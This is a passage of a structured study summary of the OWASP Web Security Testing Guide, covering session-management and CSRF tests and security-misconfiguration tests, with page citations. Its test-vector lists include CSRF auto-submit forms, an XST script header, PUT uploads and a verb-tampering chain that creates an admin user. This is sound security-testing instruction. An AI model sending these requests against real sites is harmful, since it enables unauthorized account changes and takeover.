- **SESS-01:** clear-text token `192.168.100.1:owaspuser:password:15:58`; its encodings — Hex `3139322E...3538`, Base64 `MTkyLjE2OC4xMDAuMTpvd2FzcHVzZXI6cGFzc3dvcmQ6MTU6NTg=`, MD5 `01c2fc4f0a817afd8366689bd29dd40a`; hybrid `owaspuser:192.168.100.1:a7656fafe94dae72b1e1487670148412`; structured `ID=5a0acfc7ffeb919:CR=1:TM=1120514521:LM=1120514521:S=j3am5KzC4v01ba3q`.
- **SESS-02:** secure cookie `Set-Cookie: __Host-SID=<session token>; path=/; Secure; HttpOnly; SameSite=Strict`; `SameSite=None; Secure`.
- **SESS-03:** reuse `JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1` across the pre-auth GET and the authenticating POST.
- **SESS-05 (CSRF):**
  - GET: `https://[target]/fwmgt/delete?rule=*` ; zero-size image `<img src="https://www.company.example/action" width="0" height="0">`.
  - POST (auto-submit): `<body onload='document.CSRF.submit()'><form action='http://targetWebsite/Authenticate.jsp' method='POST' name='CSRF'><input type='hidden' name='name' value='Hacked'><input type='hidden' name='password' value='Hacked'></form></body>`.
  - JSON: `<form action='http://victimsite.com' method='POST' enctype='text/plain'><input type='hidden' name='{"name":"hacked","password":"hacked","padding":"' value='something"}' />` → body `{"name":"hacked","password":"hacked","padding":"=something"}`.

#### 4. Tools Mentioned
- **Wireshark** / proxy — sniff credentials in transit (ATHN-01, p. 138).
- **Burp Intruder**, **THC Hydra**, **Nikto 2** — default/guessable credential testing (p. 146).
- **WebGoat**, **OWASP ZAP** — auth-bypass practice/testing (p. 154).
- **OWASP ZAP** (session token analysis), **Burp Sequencer**, **YEHG's JHijack** — session randomness (p. 189).
- **Intercepting proxy** (ZAP, Burp), browser plug-ins **Tamper Data**, **FireSheep**, **EditThisCookie**, **Cookiebro** — cookie attributes (p. 193).
- **OWASP ZAP** — session fixation (p. 197).
- **OWASP ZAP**, **CSRF Tester**, **Pinata-csrf-tool** — CSRF (p. 205).

#### 5. Indicators of Vulnerability
- **ATHN-01:** any login/account/session exchange over `http://` exposing plaintext credentials or a session token (pp. 140–142).
- **ATHN-02:** successful authentication with a known default or predictable generated credential (pp. 143–145).
- **ATHN-03:** account not locked after the expected threshold, or an unlock link that is guessable/replayable (pp. 147–148).
- **ATHN-04:** protected page returns `200 OK ... <H1>You Are Authenticated</H1>` after forced browsing / flag flip; predictable session IDs (pp. 150–152).
- **SESS-01:** clear-text/structured tokens, static fields, or incrementing/time-based values enabling prediction or forgery (pp. 186–188).
- **SESS-02:** missing `Secure`/`HttpOnly`/`SameSite`, over-broad `Domain`/`Path`, or absent `__Host-`/`__Secure-` prefixes (pp. 191–193).
- **SESS-03:** "As no new cookie has been issued upon a successful authentication, the tester knows that it is possible to perform session hijacking." (p. 195)
- **SESS-05:** a state-changing action succeeds when triggered from an attacker-hosted page while the victim is authenticated (pp. 203–205).

#### 6. False Positives & Limitations
- **ATHN-03:** Perform lockout tests at the end of the plan if only one account is available, to avoid losing testing time; "A CAPTCHA may hinder brute force attacks, but ... should not replace a lockout mechanism" and can itself be bypassed. Manual admin unlock "may lead to a denial-of-service attack if an attacker's goal is to lock the accounts of all users." (pp. 146–148)
- **ATHN-02:** verbose error messages aid username enumeration but account-lockout policy can lock the admin account during guessing, "troublesome for the system administrator to reset it." (pp. 143–144)
- **SESS-01:** time quantization matters — "Even a quantization of 50ms or less may be too coarse"; sufficient samples range "from a handful ... to several thousands"; "A cookie collected before being authenticated can be very different from a cookie obtained after the authentication." (pp. 187–188)
- **SESS-03:** the forced-cookie strategy "only needs to be applied to sites without full HSTS adoption (sites with full HSTS adoption are secure)"; use two machines/browsers "to decrease the number of false positives if the web application does fingerprinting." (p. 196)
- **SESS-05:** "the use of POST alone is not enough to correct the occurrence of CSRF vulnerabilities" (POST can be automated via JavaScript); exploitation requires the victim to be currently authenticated, and only applies when the session relies solely on browser-known values (not form-based auth). (pp. 203–204)

#### 7. Key Quotes from the Book
> "Testing the authentication schema means understanding how the authentication process works and using that information to circumvent the authentication mechanism." — §4.4.4 Summary, p. 149
> "if a user directly requests a different page via forced browsing, that page may not check the credentials of the user before granting access." — §4.4.4 Direct Page Request, p. 149
> "An attacker who is able to predict and forge a weak cookie can easily hijack the sessions of legitimate users." — §4.6.1 Summary, p. 184
> "Session fixation is enabled by the insecure practice of preserving the same value of the session cookies before and after authentication." — §4.6.3 Summary, p. 194
> "Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unintended actions on a web application in which they are currently authenticated." — §4.6.5 Summary, p. 200
> "The application should always first invalidate the existing session ID before authenticating a user, and if the authentication is successful, provide another session ID." — §4.6.3 Remediation, p. 197

---

### 5. Security Misconfiguration
**OWASP Category:** A02:2025 *(task-supplied; book cites vendor hardening guides, CIS Benchmarks, NIST SP 800-92, PCI DSS)*
**WSTG Test ID(s):** WSTG-CONF-01 (Network Infrastructure Config), CONF-02 (Application Platform Config), CONF-03 (File Extensions Handling), CONF-04 (Old/Backup/Unreferenced Files), CONF-05 (Admin Interfaces), CONF-06 (HTTP Methods), CONF-07 (HSTS), CONF-11 (Cloud Storage). *(Full chapter range CONF-01…CONF-11.)*
**Source:** WSTG v4.2, Ch. 4.2 Configuration and Deployment Management Testing — CONF-01 pp. 88–91; CONF-02 pp. 91–97; CONF-05 pp. 106–109; CONF-06 pp. 109–113 (with CONF-03/04/07/11 summarized where cited).

#### 1. Test Objectives
- **CONF-01:** "Review the applications' configurations set across the network and validate that they are not vulnerable." / "Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials." (p. 88)
- **CONF-02:** "Ensure that defaults and known files have been removed." / "Validate that no debugging code or extensions are left in the production environments." / "Review the logging mechanisms set in place for the application." (p. 91)
- **CONF-05:** "Identify hidden administrator interfaces and functionality." (p. 106)
- **CONF-06:** "Enumerate supported HTTP methods. Test for access control bypass. Test XST vulnerabilities. Test HTTP method overriding techniques." (p. 109)
- **CONF-03:** verify how each file extension is handled per web directory, and which directories allow script execution (p. 99).
- **CONF-07 (HSTS):** verify the `Strict-Transport-Security` header and its `max-age`/`includeSubDomains` directives (p. 115).
- **CONF-11 (Cloud):** identify misconfigured/publicly accessible cloud storage (e.g., S3 buckets) (p. 124).

#### 2. Testing Approach & Methodology
**CONF-01 Network infrastructure:** After mapping the architecture, (1) determine the elements and how they affect the app's security; (2) review each for **known vulnerabilities**; (3) review the **administrative tools** (FTP, WebDAV, NFS/CIFS, embedded admin interfaces); (4) review authentication systems; (5) maintain a change-controlled list of required ports. Blind pen-tests typically rely on automated tools; best results come from gray-box knowledge of exact versions/patches so the tester can confirm real exposure. "Change the default username and password" on admin interfaces. (pp. 88–90)

**CONF-02 Application platform:** Black-box — hunt **sample/known files and directories** left by default installs (historically vulnerable, e.g. CVE-1999-0449); **comment review** of static+dynamic content for leaked internal info/source; **system configuration** against baselines. Gray-box — **configuration review** (enable only required modules; custom error pages for 40x/50x so errors/code don't leak; least-privilege service account; proper logging; DoS/overload handling; strict ACLs on IIS `applicationHost.config`/`redirection.config`/`administration.config`; protect `machine.config`/`web.config` secrets). **Logging review**: do logs hold sensitive data; stored on a dedicated server; can logging cause DoS; rotation/retention; review process; backups; are logged values validated. (pp. 91–96)

**CONF-05 Admin interfaces:** Discover via directory/file enumeration & brute force (`/admin`, `/administrator`), Google dorks, comments/links in source, server/app documentation + default-password lists, publicly-known default interfaces (e.g. WordPress), **alternative ports** (e.g. Tomcat admin on 8080), and **parameter tampering** (hidden `admin` field or cookie `useradmin`). Then attempt auth bypass or (cautiously) brute force, watching for admin-account lockout. Gray-box: verify IP filtering/hardening, no default creds, clear separation of duties in source, and check framework-specific default admin paths. (pp. 106–108)

**CONF-06 HTTP methods:** (1) **Discover supported methods** via `OPTIONS` and by issuing each verb directly (confirm, don't trust `OPTIONS`); use the Nmap `http-methods` script. (2) **Test PUT** — capture a base request, change method to PUT, upload a `test.html`, confirm with GET (2xx/3xx ⇒ vulnerable; can lead to web-shell/RCE/defacement). (3) **Access-control bypass** — on a page that normally forces login, try `HEAD`, `POST`, `PUT`, and arbitrary verbs (`BILBAO`, `FOOBAR`, `CATS`); a non-login `200 OK` suggests authN/authZ bypass; chain blind requests to create/elevate a user. (4) **Cross-Site Tracing (XST)** — `TRACE` reflects the request back; can bypass `HttpOnly` to read cookies in some scenarios. (5) **HTTP method overriding** — when PUT/DELETE return `405`, replay with `X-HTTP-Method` / `X-HTTP-Method-Override` / `X-Method-Override`; a `200` shows overriding is supported. (pp. 109–113)

**CONF-03 File extensions / CONF-04 Backup files:** Submit requests with different extensions per directory; identify extensions that should never be returned (`.inc`, `.bak`, `.old`, `~`, `.zip/.tar/.gz` archives). Backup/unreferenced files (e.g. `login.asp.old`, `viewdoc.bak`) are served as plain text, disclosing server-side source or whole-webroot archives. (pp. 99–104)

**CONF-07 HSTS:** Check response header `Strict-Transport-Security: max-age=<n>; includeSubDomains` (e.g. via `curl -s -D- https://host | grep -i strict`). (p. 115)

**CONF-11 Cloud storage:** Test public read/write on cloud storage, e.g. `curl -X GET https://<cloud-storage-service>/<object>` and `curl -X PUT -d 'test' 'https://<cloud-storage-service>/test.txt'`; for S3 use virtual-host-style (`https://bucket.s3.Region.amazonaws.com/key`) or path-style URLs. (p. 124)

#### 3. Test Vectors & Payloads
- **HTTP methods — OPTIONS/Nmap:** `nmap -p 443 --script http-methods --script-args http-methods.url-path='/index.php' localhost`.
- **PUT upload:** `PUT /test.html HTTP/1.1` + body `<html>HTTP PUT Method is Enabled</html>`, confirm via GET.
- **Access-control bypass:** `HEAD /admin HTTP/1.1` (expect redirect/login; `200 OK` ⇒ suspicious); exploit chain `HEAD /admin/createUser.php?member=myAdmin` ; `PUT /admin/changePw.php?member=myAdmin&passwd=foo123&confirm=foo123` ; `CATS /admin/groupEdit.php?group=Admins&member=myAdmin&action=add`.
- **XST:** `TRACE / HTTP/1.1` + `Host:` + `Attack: <script>prompt()</script>` (reflected in response).
- **Method override:** blocked `DELETE /resource.html` (405) replayed with `X-HTTP-Method: DELETE` → `200 OK`.
- **Admin-interface guesses:** `/admin`, `/administrator`, WordPress `wp-admin/*`, PHP `/phpmyadmin/`, `/login.php`, WebLogic `/AdminMain`, WebSphere `/admin-authz.xml`, FrontPage `/administrators.pwd`; hidden `<input type="hidden" name="admin" value="no">` ; cookie `useradmin=0`.
- **Sensitive extensions / backups:** `connection.inc`, `login.asp.old`, `viewdoc.bak`, `myservlets.jar.old`, emacs `file~`, `file.old`, `.tar/.zip/.gz` archives.
- **HSTS probe:** `curl -s -D- https://owasp.org | grep -i strict` → `Strict-Transport-Security: max-age=31536000; includeSubDomains`.
- **Cloud storage:** `curl -X GET https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png` ; `curl -X PUT -d 'test' 'https://<cloud-storage-service>/test.txt'`.

#### 4. Tools Mentioned
- **Vulnerability scanners / CGI scanners** — known files & directories (pp. 89, 92, 99); **Nessus**, **Nikto** (p. 99).
- **CIS-CAT Lite**, **Microsoft Attack Surface Analyzer**, **NIST National Checklist Program** — config baselines (p. 92).
- **OWASP ZAP** (Forced Browse), **THC-Hydra** (brute force form auth), **netsparker dictionary**, **FuzzDB** — admin-interface discovery (p. 109).
- **Ncat**, **cURL**, **nmap `http-methods` NSE script**, **w3af `htaccess_methods` plugin** — HTTP-method testing (p. 113).
- **Spidering/mirroring tools** — file-extension handling (p. 99).

#### 5. Indicators of Vulnerability
- Default sample apps/files present (historically CVE-bearing) (p. 92).
- Internal info/source leaked via HTML comments or verbose 40x/50x errors (pp. 92–93).
- Sensitive data in logs: "Debug information, Stack traces, Usernames, System component names, Internal IP addresses..." (p. 94).
- Admin interface reachable without proper controls (hidden fields/cookies, alternate port, default path) (pp. 106–108).
- HTTP methods: PUT upload confirmed by GET (web-shell/RCE risk); non-login `200 OK` on restricted paths via alternate verbs; `TRACE` reflecting attacker headers; `405`→`200` after an override header (pp. 110–112).
- Backup files served as plain source; HSTS header absent/weak; cloud bucket responds to anonymous GET/PUT (pp. 103, 115, 124).

#### 6. False Positives & Limitations
- Version-based scanner flags "lead to both false positives and false negatives" — obscured version ⇒ false negative; back-ported patches without version bump ⇒ false positive; coverage is "very good for common products" but "lacking for lesser known products"; scanners usually only find vulnerabilities in "exposed" elements, missing back-end DBs/auth/reverse proxies (p. 89).
- "the only way to be really sure is to do a full review of the contents of the web server or application server and determine whether they are related to the application itself or not" (p. 92).
- Testing can be destructive in production: PUT web-shell upload, blind user-creation chains, and DoS-style log-flooding to test log storage are "as dangerous in production environments" (pp. 95, 110). PUT POC files should be overwritten/removed promptly (p. 110).
- Config recommendations are not one-size-fits-all: "It is impossible to generically say how a server should be configured" — follow vendor/baseline guidance per site policy (p. 92).

#### 7. Key Quotes from the Book
> "It takes only a single vulnerability to undermine the security of the entire infrastructure, and even small and seemingly unimportant problems may evolve into severe risks for another application on the same server." — §4.2.1 Summary, p. 88
> "While the typical web and application server installation will contain a lot of functionality (like application examples, documentation, test pages) what is not essential should be removed before deployment to avoid post-install exploitation." — §4.2.2 Summary, p. 91
> "In many instances, such interfaces do not have sufficient controls to protect them from unauthorized access." — §4.2.5 Summary (admin interfaces), p. 106
> "Since the other methods are so rarely used, many developers do not know, or fail to take into consideration, how the web server or application framework's implementation of these methods impact the security features of the application." — §4.2.6 Summary (HTTP methods), p. 109
> "Leveraging the PUT method an attacker may be able to place arbitrary and potentially malicious content, into the system which may lead to remote code execution, defacing the site or denial of service." — §4.2.6 Testing the PUT Method, p. 110
